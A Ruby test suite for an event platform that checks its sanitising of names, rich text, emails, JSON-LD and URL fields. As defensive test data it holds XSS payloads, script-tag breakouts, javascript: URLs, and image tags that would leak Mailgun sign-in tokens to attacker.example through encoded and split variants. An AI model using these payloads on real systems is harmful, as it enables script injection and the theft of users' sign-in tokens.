require_relative '../test_config'

# What an event's names, rich text, links and emails keep and escape
class EventContentSafetyTest < ActiveSupport::TestCase
  include Rack::Test::Methods

  test 'ticket email strips event-handler attributes from editor HTML' do
    create_event(
      prices: [0],
      extra_info_for_ticket_email: '<img src=x onerror=alert(1)><p>Zoom link</p>',
      ticket_email_greeting: '<p>Hello</p><img src=x onerror=alert(1)>'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(/onerror/i, html)
    refute_includes html, 'alert(1)'
    assert_includes html, 'Zoom link'
    assert_includes html, 'Hello'
  end

  test 'ticket email strips sign-in tokens from custom html images' do
    create_organisation(show_details_table_in_ticket_emails: true, show_sign_in_link_in_ticket_emails: true)
    create_event(
      name: 'Workshop %recipient.token%',
      prices: [0],
      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.tok%recipient.token%en%">'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_includes html, 'Workshop %recipient.token%'
    assert_includes html, 'Workshop'
    assert_includes html, 'link_token=%recipient.token%'
  end

  test 'names cannot keep a mailgun recipient token' do
    refute_includes EmailHelper.untrusted('%recipient.tok%recipient.token%en%', strip: true), '%recipient.token%'
    assert_equal '', EmailHelper.untrusted('%recipient.%recipient.x%token%', strip: true)
    assert_equal 'Ada %recipient.firstname', EmailHelper.untrusted('Ada %recipient.firstname%recipient.token%', strip: true)

    create_event(name: 'Workshop %recipient.token%', prices: [0])
    @account.update!(name: 'Ada %recipient.token%')
    @organisation.update!(name: 'Org %recipient.token%')

    assert_equal 'Workshop', @event.name
    assert_equal 'Ada', @account.name
    assert_equal 'Org', @organisation.name

    @event.update!(name: 'Workshop %recipient.tok%recipient.token%en%')
    @account.update!(name: 'Ada %recipient.tok%recipient.token%en%')
    @organisation.update!(name: 'Org %recipient.tok%recipient.token%en%')

    [@event, @account, @organisation].each { |record| refute_includes record.name, '%recipient.token%' }

    @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
    refute_includes @event.name, '%recipient'
  end

  test 'recipient variable values cannot open a mailgun recipient token' do
    create_event(prices: [0])
    # Survives name sanitising: if Mailgun fills in lastname (blank) after description_elements, it leaves %recipient.token%
    @event.ticket_types.first.update!(name: 'VIP %recipient.%recipient.lastname%token%')
    order = @event.orders.create!(account: @account, currency: @event.currency, value: 0, payment_completed: true)
    order.tickets.create!(event: @event, account: @account, ticket_type: @event.ticket_types.first, price: 0)

    description_elements = EmailFields.recipient_tag_values(event: @event, account: @account, orders: [order])['description_elements']

    assert_includes description_elements, 'VIP'
    refute_includes description_elements.gsub('%recipient.lastname%', ''), '%recipient.token%'
  end

  test 'mailgun recipient variable values cannot open a recipient token' do
    # Mailgun rescans subjects, so text and values that join into %recipient.token% get filled in (tested Oct 2026);
    # replace_recipient_variables fills in key by key, which does the same
    texts = ['%recipient.firstname%%', '%recipient.firstname%%recipient.lastname%', '%%recipient.lastname%%', '%recipient.username%recipient%recipient.fullname%%']
    ['%recipient.token', '% recipient.token%', 'Ada recipient.token', 'Ada .token%'].each do |name|
      account = FactoryBot.create(:account, name: name)
      batch_message = Mailgun::BatchMessage.new(Mailgun::Client.new('key'), 'example.com') # rubocop:disable Dandelion/MailgunDirect -- tests EmailHelper::RecipientVariables on a real BatchMessage, which sends nothing
      batch_message.add_recipient(:to, account.email, { 'firstname' => account.firstname, 'lastname' => account.lastname, 'fullname' => account.name, 'username' => nil, 'token' => 'SECRET' })
      variables = batch_message.recipient_variables[account.email]

      texts.each do |text|
        refute_includes EmailFields.replace_recipient_variables(EmailHelper.untrusted(text), variables), 'SECRET', "#{name.inspect} with #{text.inspect}"
        batch_message.subject(text)
        refute_includes EmailFields.replace_recipient_variables(Array(batch_message.message[:subject]).last, variables), 'SECRET', "subject #{name.inspect} with #{text.inspect}"
      end
      assert_equal 'SECRET', variables['token']
      assert_nil variables['username']
    end
  end

  test 'names never keep angle brackets however they were encoded' do
    # Double-encoded so a single decode pass would otherwise leave live markup in the name
    create_event(name: 'Workshop &lt;img src="https://attacker.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;', prices: [0])
    @account.update!(name: 'Ada &lt;b&gt;Lovelace&lt;/b&gt;')

    refute_match(/[<>]/, @event.name)
    refute_match(/[<>]/, @account.name)
    assert_equal 'Ada', @account.firstname
  end

  test 'rich text keeps only the allowed style properties' do
    html = '<p style="position:fixed;z-index:9;background:url(https://attacker.example/x.png);color:red;text-align:center">x</p>' \
           '<span style="width:10px;inset:0;background-color:blue">y</span>'
    [Sanitize::Config::DANDELION, Sanitize::Config::IFRAMES].each do |config|
      assert_equal '<p style="color:red;text-align:center">x</p><span style="width:10px;background-color:blue">y</span>',
                   Sanitize.fragment(html, config)
    end
  end

  test 'rich text keeps only the classes CKEditor and our own markup use' do
    html = '<div class="position-fixed top-0 start-0 w-100 vh-100 bg-white z-3">x</div>' \
           '<div class="offcanvas offcanvas-start show"><div class="offcanvas-body">y</div></div>' \
           '<a class="btn btn-primary stretched-link" href="https://example.com">z</a>' \
           '<figure class="image image-style-align-left"><img src="https://example.com/a.png"></figure>' \
           '<p class="lead">l</p><pre><code class="language-ruby">c</code></pre>'
    [Sanitize::Config::DANDELION, Sanitize::Config::IFRAMES].each do |config|
      assert_equal '<div>x</div><div><div>y</div></div>' \
                   '<a class="btn btn-primary" href="https://example.com">z</a>' \
                   '<figure class="image image-style-align-left"><img src="https://example.com/a.png"></figure>' \
                   '<p class="lead">l</p><pre><code class="language-ruby">c</code></pre>',
                   Sanitize.fragment(html, config)
    end
  end

  test 'rsvp button text is escaped on the event page' do
    create_event(prices: [0], rsvp_button_text: '<img src=x onerror=alert(1)>')

    get "/e/#{@event.slug}"
    assert last_response.ok?
    refute_match(%r{<img[^>]*onerror}, last_response.body)
    assert_includes last_response.body, '&lt;img src=x onerror=alert(1)&gt;'
  end

  test 'json-ld cannot close the script tag' do
    create_event(prices: [0], description: '<p>Welcome</p>')
    # location/website are not name-sanitised; description text is HTML-decoded
    @event.set(location: '</script><img src="https://attacker.example/x">')
    @event.set(description: '<p>&lt;/script&gt;<img src="https://attacker.example/x"></p>')
    @organisation.set(website: 'https://example.com/</script><img src="https://attacker.example/x">')
    @event.reload
    @organisation.reload

    get "/e/#{@event.slug}"
    assert last_response.ok?

    json_ld = last_response.body[%r{<script type="application/ld\+json">\s*(.*?)\s*</script>}m, 1]
    assert json_ld, 'expected JSON-LD block'
    refute_includes json_ld, '</script>'
    assert_includes json_ld, '\u003c/script\u003e'

    parsed = JSON.parse(json_ld)
    assert_equal @event.location, parsed.dig('location', 'name')
    assert_equal @event.organisation.website, parsed.dig('organizer', 'url')
    assert_equal '</script>', parsed['description']
  end

  test 'names are escaped in emails' do
    create_event(prices: [0])
    # Bypass sanitisation: output escaping must hold even for a stored name containing live markup
    @event.set(name: 'Workshop <img src="https://attacker.example/x?t=&#37;recipient.token&#37;">')

    html = EmailHelper.html(:waitlist_tickets_available, event: @event)

    refute_match(/<img[^>]*attacker\.example/, html)
    assert_includes html, 'Workshop &lt;img'
    assert_equal html.scan('link_token=%recipient.token%').size, html.scan('%recipient.token%').size
  end

  test 'youtube titles are escaped in emails' do
    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
    EmailHelper.stub(:youtube_title, '<img src="https://attacker.example/x?t=%recipient.token%"> & more') do
      html = EmailHelper.rich_text(@event.extra_info_for_ticket_email)

      refute_match(/<img[^>]*attacker\.example/, html)
      refute_includes html, '%recipient.token%'
      assert_includes html, '&lt;img'
      assert_includes html, '&amp; more'
    end
  end

  test 'private youtube videos are linked without a title in emails' do
    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
    EmailHelper.stub(:youtube_title, nil) do
      assert_includes EmailHelper.rich_text(@event.extra_info_for_ticket_email),
                      '<a href="https://www.youtube.com/watch?v=abc123">link to private YouTube video</a>'
    end
  end

  test 'intentional html still renders in emails' do
    create_organisation(show_details_table_in_ticket_emails: true)
    create_event(name: 'Tom & Jerry', prices: [0], extra_info_for_ticket_email: '<p>See <strong>you</strong> there</p>')
    order = @event.orders.new(account: @account)
    tickets_table = EmailHelper.render(:_tickets_table, event: @event, account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: tickets_table, header_image_url: nil)

    assert_includes html, 'Tom &amp; Jerry'
    assert_includes html, '<strong>you</strong>'
    assert_includes html, '<table class="event-details"'
  end

  test 'redirect_url must be a valid http or https URL' do
    create_organisation
    event = FactoryBot.build(:event, organisation: @organisation)

    event.redirect_url = 'https://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'http://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'javascript:alert(document.cookie)'
    refute event.valid?
    assert_includes event.errors[:redirect_url], 'must be a valid http or https URL'

    event.redirect_url = 'data:text/html,<script>alert(1)</script>'
    refute event.valid?

    event.redirect_url = nil
    assert event.valid?
  end

  test 'safe_redirect_url ignores stored javascript URLs' do
    create_event
    @event.set(redirect_url: 'javascript:alert(1)')

    assert_nil @event.reload.safe_redirect_url
    assert_equal 'https://example.org/thanks', @event.tap { |e| e.redirect_url = 'https://example.org/thanks' }.safe_redirect_url
  end

  test 'link fields reject javascript: and other non-http schemes' do
    create_event
    ['javascript:alert(1)', 'JavaScript:alert(1)', ' javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'].each do |url|
      @event.purchase_url = url
      @event.facebook_event_url = url
      refute @event.valid?, url
      assert @event.errors[:purchase_url].any?, url
      assert @event.errors[:facebook_event_url].any?, url

      @organisation.website = url
      @organisation.become_a_member_url = url
      refute @organisation.valid?, url
      assert @organisation.errors[:website].any?, url
      assert @organisation.errors[:become_a_member_url].any?, url

      @account.website = url
      refute @account.valid?, url
      assert @account.errors[:website].any?, url
    end
  end

  test 'link fields accept http and https and add https:// to a bare domain' do
    create_event
    @organisation.update!(website: 'http://example.com', become_a_member_url: 'https://example.com/join')
    assert_equal 'http://example.com', @organisation.website
    @account.update!(website: '  www.example.com/me ')
    assert_equal 'https://www.example.com/me', @account.website
    @event.update!(purchase_url: 'https://tickets.example.com/x', facebook_event_url: '')
    assert_equal 'https://tickets.example.com/x', @event.purchase_url
    assert_nil @event.facebook_event_url
  end

  test 'activity website rejects javascript:' do
    create_organisation
    activity = @organisation.activities.build(name: 'Activity', slug: 'activity', account: @account, website: 'javascript:alert(1)')
    refute activity.valid?
    assert activity.errors[:website].any?
  end

  test 'terms and conditions url rejects javascript:' do
    create_event
    @event.terms_and_conditions_url = 'javascript:alert(1)'
    refute @event.valid?
    assert @event.errors[:terms_and_conditions_url].any?
    @organisation.terms_and_conditions_url = 'javascript:alert(1)'
    refute @organisation.valid?
    assert @organisation.errors[:terms_and_conditions_url].any?
  end

  test 'location signal group link rejects javascript:' do
    location = Location.new(name: 'Somewhere', signal_group_link: 'javascript:alert(1)')
    refute location.valid?
    assert location.errors[:signal_group_link].any?
    location.signal_group_link = 'https://signal.group/#abc'
    assert location.valid?
  end

  test 'non-ASCII http urls are accepted' do
    assert HttpUrl.valid?('https://example.com/café')
    assert HttpUrl.valid?('https://bücher.de/')
    assert_not HttpUrl.valid?('javascript:alert("é")')
    assert_not HttpUrl.valid?('https://example.com/a b')
    assert_equal 'bücher.de', HttpUrl.host('https://www.bücher.de/x')

    create_organisation
    @organisation.website = 'example.com/café'
    assert @organisation.valid?, @organisation.errors.full_messages.to_sentence
    assert_equal 'https://example.com/café', @organisation.website

    @organisation.website = 'coming soon'
    assert_not @organisation.valid?
  end
end
